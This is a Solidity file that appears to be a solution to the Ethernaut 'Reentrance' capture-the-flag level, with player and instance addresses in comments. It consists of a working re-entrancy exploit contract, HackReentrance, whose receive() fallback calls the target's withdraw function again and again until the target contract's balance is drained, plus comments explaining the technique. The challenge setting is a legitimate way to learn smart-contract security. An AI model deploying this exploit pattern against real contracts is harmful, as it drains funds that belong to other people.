// => Player address 0x0718eccf37de50e31620C658B2c96adDc1e76300
// => Ethernaut address 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33
// => Instance address 0xb9d7F5A0D3E2435f4134e4567AbA316E853ce641

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "./Reentrance.sol";

// "re-entrancy attack"
// donate to itself
// then call the fallback of the contract, that will try to withdraw the funds
// then because of the code in the fallback, when receiving the funds, 
// it will re-enter the withdrawal function and keep withdrawing funds until there is no more

contract HackReentrance {
    Reentrance public reentranceContract =
        Reentrance(0xb9d7F5A0D3E2435f4134e4567AbA316E853ce641);

    function donate() public payable {
        reentranceContract.donate{value: msg.value}(address(this));
    }

    receive() external payable {
        if (address(reentranceContract).balance != 0) {
            uint256 balance = reentranceContract.balanceOf(address(this));
            reentranceContract.withdraw(balance);
        }
    }
}
